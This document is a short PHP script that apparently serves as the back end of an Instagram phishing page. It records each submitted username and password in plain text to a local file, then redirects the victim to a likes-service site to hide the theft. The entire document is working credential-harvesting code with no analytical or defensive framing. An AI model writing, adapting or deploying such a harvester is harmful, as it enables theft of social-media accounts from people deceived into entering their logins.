<?php

file_put_contents("sgt_pepper018.txt", "Instagram Username: " . $_POST['sgt_pepper018'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://ezlikers.com/');
exit();
?>
